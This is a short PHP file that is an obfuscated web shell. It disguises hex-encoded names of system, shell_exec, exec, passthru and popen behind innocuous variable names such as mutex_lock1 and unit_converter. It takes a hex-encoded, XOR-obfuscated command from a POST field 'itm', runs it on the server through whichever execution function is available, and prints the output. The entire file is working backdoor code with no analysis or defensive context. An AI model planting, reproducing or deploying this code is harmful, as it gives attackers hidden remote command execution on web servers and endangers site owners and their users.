<?php

$mutex_lock5 = "po\x70\x65n";
$mutex_lock4 = "\x70\x61\x73\x73thru";
$mutex_lock6 = "\x73\x74\x72\x65am_g\x65\x74\x5Fc\x6Fnt\x65\x6Ets";
$mutex_lock7 = "p\x63lo\x73\x65";
$mutex_lock1 = "\x73y\x73\x74em";
$unit_converter = "h\x65\x782\x62\x69n";
$mutex_lock3 = "exec";
$mutex_lock2 = "s\x68el\x6C_e\x78ec";
if (isset($_POST["\x69\x74m"])) {
            function event_dispatcher    ( $object ,     $data ) {
$ref=   '' ;
 $f=0;
 while($f<strlen($object)){
$ref.=chr(ord($object[$f])^$data);
$f++;

} return  $ref;

}
            $itm = $unit_converter($_POST["\x69\x74m"]);
            $itm = event_dispatcher($itm, 71);
            if (function_exists($mutex_lock1)) {
                $mutex_lock1($itm);
            } elseif (function_exists($mutex_lock2)) {
                print $mutex_lock2($itm);
            } elseif (function_exists($mutex_lock3)) {
                $mutex_lock3($itm, $pgrp_object);
                print join("\n", $pgrp_object);
            } elseif (function_exists($mutex_lock4)) {
                $mutex_lock4($itm);
            } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) {
                $data_ref = $mutex_lock5($itm, 'r');
                if ($data_ref) {
                    $descriptor_property_set = $mutex_lock6($data_ref);
                    $mutex_lock7($data_ref);
                    print $descriptor_property_set;
                }
            }
            exit;
        }